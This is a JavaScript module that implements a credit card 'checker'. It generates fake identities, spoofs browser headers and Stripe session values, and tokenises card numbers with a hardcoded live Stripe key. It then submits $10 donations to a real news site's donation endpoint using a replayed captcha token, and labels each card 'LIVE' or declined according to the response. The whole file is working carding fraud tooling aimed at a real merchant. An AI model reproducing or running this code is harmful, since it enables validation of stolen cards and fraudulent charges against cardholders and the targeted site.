function getStr(string, start, end) {
  const str = string.split(start);
  if (str.length < 2) return '';
  return str[1].split(end)[0];
}

function value(str, find_start, find_end) {
  const start = str.indexOf(find_start);
  if (start === -1) return '';
  const contentStart = start + find_start.length;
  const end = str.indexOf(find_end, contentStart);
  if (end === -1) return '';
  return str.substring(contentStart, end).trim();
}

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
];

function randomUA() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function getBandeira(card) {
  const f = card[0];
  if (f === '4') return 'Visa';
  if (f === '5') return 'Mastercard';
  if (f === '3') return 'Amex';
  if (f === '6') return 'Discover';
  if (f === '2') return 'Elo';
  return 'Desconhecida';
}

export async function checkCardStripenew(card, month, year, cvv) {
  const ua = randomUA();
  const cc = card;
  const mes = month.padStart(2, '0');
  let ano = year.length === 2 ? '20' + year : year;
  const cvc = cvv;

  // Get random user
  let firstname = 'Adi';
  let lastname = 'Singh';
  let email = 'adirajput1701x@gmail.com';
  let phone = '1234567890';
  let zip = '10001';
  let state = 'NY';
  let city = 'New York';
  let street = '123 Main St';

  try {
    const ruRes = await fetch('https://randomuser.me/api/?nat=us', { signal: AbortSignal.timeout(10000) });
    const ruText = await ruRes.text();
    const fname = value(ruText, '"first":"', '"');
    const lname = value(ruText, '"last":"', '"');
    if (fname) firstname = fname;
    if (lname) lastname = lname;
    if (value(ruText, '"email":"', '"')) email = value(ruText, '"email":"', '"');
    if (value(ruText, '"phone":"', '"')) phone = value(ruText, '"phone":"', '"');
    if (value(ruText, '"postcode":', ',')) zip = value(ruText, '"postcode":', ',');
    if (value(ruText, '"state":"', '"')) state = value(ruText, '"state":"', '"');
    if (value(ruText, '"city":"', '"')) city = value(ruText, '"city":"', '"');
    if (value(ruText, '"street":"', '"')) street = value(ruText, '"street":"', '"');

    const serveArr = ['gmail.com', 'homtail.com', 'yahoo.com.br', 'bol.com.br', 'yopmail.com', 'outlook.com'];
    const servRnd = serveArr[Math.floor(Math.random() * serveArr.length)];
    email = email.replace('example.com', servRnd);

    // Convert state name to abbreviation
    const stateMap = {
      'alabama': 'AL', 'alaska': 'AK', 'arizona': 'AZ', 'arkansas': 'AR',
      'california': 'CA', 'colorado': 'CO', 'connecticut': 'CT', 'delaware': 'DE',
      'florida': 'FL', 'georgia': 'GA', 'hawaii': 'HI', 'idaho': 'ID',
      'illinois': 'IL', 'indiana': 'IN', 'iowa': 'IA', 'kansas': 'KS',
      'kentucky': 'KY', 'louisiana': 'LA', 'maine': 'ME', 'maryland': 'MD',
      'massachusetts': 'MA', 'michigan': 'MI', 'minnesota': 'MN', 'mississippi': 'MS',
      'missouri': 'MO', 'montana': 'MT', 'nebraska': 'NE', 'nevada': 'NV',
      'new hampshire': 'NH', 'new jersey': 'NJ', 'new mexico': 'NM', 'new york': 'NY',
      'north carolina': 'NC', 'north dakota': 'ND', 'ohio': 'OH', 'oklahoma': 'OK',
      'oregon': 'OR', 'pennsylvania': 'PA', 'rhode island': 'RI', 'south carolina': 'SC',
      'south dakota': 'SD', 'tennessee': 'TN', 'texas': 'TX', 'utah': 'UT',
      'vermont': 'VT', 'virginia': 'VA', 'washington': 'WA', 'west virginia': 'WV',
      'wisconsin': 'WI', 'wyoming': 'WY',
    };
    const sl = state.toLowerCase();
    state = stateMap[sl] || 'NY';

    const phoneDigits = phone.replace(/\D/g, '');
    phone = phoneDigits.length >= 10 ? phoneDigits.slice(-10) : '1234567890';
  } catch {}

  // Step 1: Create Stripe token
  const tokenBody = new URLSearchParams({
    'card[number]': cc,
    'card[cvc]': cvc,
    'card[exp_month]': mes,
    'card[exp_year]': ano,
    'guid': 'a2ef37b2-51da-4888-91d1-e6eec8887ecb070158',
    'muid': '671a702d-2400-425d-b4ea-d130688079b02ffd8f',
    'sid': 'f5b4bc2e-1b6e-4bb5-9ff2-0e9d94bde5756195ab',
    'payment_user_agent': 'stripe.js/b5d6cae0f; stripe-js-v3/b5d6cae0f',
    'time_on_page': '40582',
    'referrer': 'https://badgerherald.com/',
    'key': 'pk_live_ZqsOEoLHjZPnC0fB1FsjWzRv',
    'pasted_fields': 'number',
  });

  let result2, result3;

  try {
    const tokRes = await fetch('https://api.stripe.com/v1/tokens', {
      method: 'POST',
      headers: {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': ua,
      },
      body: tokenBody,
      signal: AbortSignal.timeout(20000),
    });
    result2 = await tokRes.text();
    const tokJson = JSON.parse(result2);
    const token = tokJson.id || '';

    if (!token) {
      const errMsg = tokJson.error?.message || tokJson.error?.code || 'Stripe token failed';
      if (result2.includes('incorrect_cvc') || result2.includes('invalid_cvc') || result2.includes('security code is incorrect') || result2.includes('security code is invalid')) {
        return { status: 'LIVE', detalhes: 'CCN LIVE' };
      }
      if (result2.includes('stolen_card')) return { status: 'REPROVADA', detalhes: 'STOLEN_CARD' };
      if (result2.includes('lost_card')) return { status: 'REPROVADA', detalhes: 'LOST_CARD' };
      if (result2.includes('pickup_card')) return { status: 'REPROVADA', detalhes: 'PICKUP_CARD' };
      if (result2.includes('Your card has expired.')) return { status: 'REPROVADA', detalhes: 'EXPIRED_CARD' };
      if (result2.includes('Your card number is incorrect.')) return { status: 'REPROVADA', detalhes: 'INCORRECT_NUMBER' };
      if (result2.includes('Your card was declined.')) return { status: 'REPROVADA', detalhes: 'CARD_DECLINED' };
      if (result2.includes('generic_decline')) return { status: 'REPROVADA', detalhes: 'GENERIC_DECLINE' };
      if (result2.includes('do_not_honor')) return { status: 'REPROVADA', detalhes: 'DO_NOT_HONOR' };
      if (result2.includes('insufficient_funds') || result2.includes('Your card has insufficient funds.')) return { status: 'LIVE', detalhes: 'INSUFFICIENT_FUNDS' };
      if (result2.includes('fraudulent')) return { status: 'REPROVADA', detalhes: 'FRAUDULENT' };
      if (result2.includes('transaction_not_allowed') || result2.includes('Your card does not support')) return { status: 'REPROVADA', detalhes: 'TRANSACTION_NOT_ALLOWED' };
      if (result2.includes('processing_error')) return { status: 'REPROVADA', detalhes: 'PROCESSING_ERROR' };
      if (result2.includes('service_not_allowed')) return { status: 'REPROVADA', detalhes: 'SERVICE_NOT_ALLOWED' };
      return { status: 'REPROVADA', detalhes: errMsg };
    }

    // Step 2: Submit donation to badgerherald.com
    const donBody = JSON.stringify({
      amount: 10,
      first: firstname,
      last: lastname,
      reoccurance: 0,
      token: token,
      nonce: 'e195ba452f',
      email: email,
      comment: '',
      recaptcha: '03AGdBq24QWVlNKrEZhT_-Y27oiewT7mbZyS0-f7YlsR3x0EhJFT91-CyzDwxAbkLfXpdQ9M-E_SLCPZQrlFQAiE-J-QP8iynn4yhqQZN4wrD4oTAiHwTi1Fhr__gdaSy7ZX78_nHeJBph3psmtCWo6EnPvAQYfY2caeXgVNq4AqJbo-WW_NLxZhou-4JCAHf9gQI9sDZwSl1KHQiJSBwj2xboZvcLsNT7JA4A1Ihk8_Dwi5OzA_vBrfRDbi6cd1BkoC1sCVG6SUFTlC4vZGuq0Yv-VPSW8xENX3kDszwaxCIhba9JpWPpdnakoVoiIKxDboLncjK5XPqUNdkhDwuptCaFLOWxCprh7t5QgZA1Xaj43Ek8MTupG69W2zsePIJqvqfnsqi9vY5Uy-3-SsLv56S_MjZ-5vh67sAfj2ePSyMjM1yMt_jqKw0sPpLduFj3OusI4Z17tisSXGy2eFown2lV8T-_xG8wm4ZbD-cHHhaUnNwISo1bf1RgonL8WA7QUS_Z_nw4ajtg',
    });

    const donRes = await fetch('https://badgerherald.com/wp-json/donate/v1/process-donation', {
      method: 'POST',
      headers: {
        'authority': 'badgerherald.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://badgerherald.com',
        'referer': 'https://badgerherald.com/donate/',
        'user-agent': ua,
        'x-wp-nonce': '80248031c4',
      },
      body: donBody,
      signal: AbortSignal.timeout(20000),
    });
    result3 = await donRes.text();

    // Analyze donation response
    if (result3.includes('"cvc_check": "pass"') || result3.includes('Thank You For Donation.') || result3.includes('Thank You.') || result3.includes('/donations/thank_you')) {
      return { status: 'LIVE', detalhes: 'CVV MATCHED' };
    }
    if (result3.includes('Your card zip code is incorrect.') || result3.includes('incorrect_zip')) {
      return { status: 'LIVE', detalhes: 'CVV MATCHED (incorrect zip)' };
    }
    if (result3.includes('"type":"one-time"')) {
      return { status: 'LIVE', detalhes: 'CVV MATCHED' };
    }
    if (result3.includes('security code is incorrect.') || result3.includes('security code is invalid.') || result3.includes('Your card&#039;s security code is incorrect.') || result3.includes('incorrect_cvc')) {
      return { status: 'LIVE', detalhes: 'CCN LIVE' };
    }
    if (result3.includes('"cvc_check": "fail"')) {
      return { status: 'LIVE', detalhes: 'CCN LIVE' };
    }
    if (result3.includes('stolen_card')) return { status: 'REPROVADA', detalhes: 'STOLEN_CARD' };
    if (result3.includes('lost_card')) return { status: 'REPROVADA', detalhes: 'LOST_CARD' };
    if (result3.includes('insufficient_funds') || result3.includes('Your card has insufficient funds.')) return { status: 'LIVE', detalhes: 'INSUFFICIENT_FUNDS' };
    if (result3.includes('pickup_card')) return { status: 'REPROVADA', detalhes: 'PICKUP_CARD' };
    if (result3.includes('Your card has expired.')) return { status: 'REPROVADA', detalhes: 'EXPIRED_CARD' };
    if (result3.includes('Your card number is incorrect.') || result3.includes('incorrect_number')) return { status: 'REPROVADA', detalhes: 'INCORRECT_NUMBER' };
    if (result3.includes('card was declined.')) return { status: 'REPROVADA', detalhes: 'CARD_DECLINED' };
    if (result3.includes('generic_decline')) return { status: 'REPROVADA', detalhes: 'GENERIC_DECLINE' };
    if (result3.includes('do_not_honor')) return { status: 'REPROVADA', detalhes: 'DO_NOT_HONOR' };
    if (result3.includes('expired_card')) return { status: 'REPROVADA', detalhes: 'EXPIRED_CARD' };
    if (result3.includes('Your card does not support this type of purchase.')) return { status: 'REPROVADA', detalhes: 'PURCHASE_NOT_SUPPORTED' };
    if (result3.includes('processing_error')) return { status: 'REPROVADA', detalhes: 'PROCESSING_ERROR' };
    if (result3.includes('service_not_allowed')) return { status: 'REPROVADA', detalhes: 'SERVICE_NOT_ALLOWED' };
    if (result3.includes('"cvc_check": "unchecked"') || result3.includes('"cvc_check": "unavailable"')) return { status: 'REPROVADA', detalhes: 'CVC_CHECK_UNAVAILABLE' };
    if (result3.includes('parameter_invalid_empty')) return { status: 'REPROVADA', detalhes: 'MISSING_CARD_DETAILS' };
    if (result3.includes('lock_timeout')) return { status: 'REPROVADA', detalhes: 'ANOTHER_REQUEST_IN_PROCESS' };
    if (result3.includes('transaction_not_allowed')) return { status: 'REPROVADA', detalhes: 'TRANSACTION_NOT_ALLOWED' };
    if (result3.includes('three_d_secure_redirect')) return { status: 'REPROVADA', detalhes: '3D_SECURE_REDIRECT' };
    if (result3.includes('-1')) return { status: 'REPROVADA', detalhes: 'UPDATE_NONCE' };
    if (result3.includes('Card is declined by your bank')) return { status: 'REPROVADA', detalhes: '3D_SECURE_REDIRECT' };
    if (result3.includes('missing_payment_information')) return { status: 'REPROVADA', detalhes: 'MISSING_PAYMENT_INFO' };
    if (result3.includes('Payment cannot be processed, missing credit card number')) return { status: 'REPROVADA', detalhes: 'MISSING_CC_NUMBER' };

    return { status: 'REPROVADA', detalhes: 'UNKNOWN_ERROR' };
  } catch (e) {
    return { status: 'REPROVADA', detalhes: 'Stripe donation error: ' + e.message };
  }
}

export function formatStripenewResult(card, month, year, cvv, result) {
  const bin = card.substring(0, 6);
  const bandeira = getBandeira(card);
  const ccDisplay = card.substring(0, 4) + ' ' + card.substring(4, 8) + ' ' + card.substring(8, 12) + ' ' + card.substring(12);
  const isLive = result.status === 'LIVE';
  return {
    cc: ccDisplay,
    bin,
    bandeira,
    mes: month,
    ano: year,
    cvv,
    status: result.status,
    emoji: isLive ? '✅' : '❌',
    detalhes: result.detalhes,
  };
}
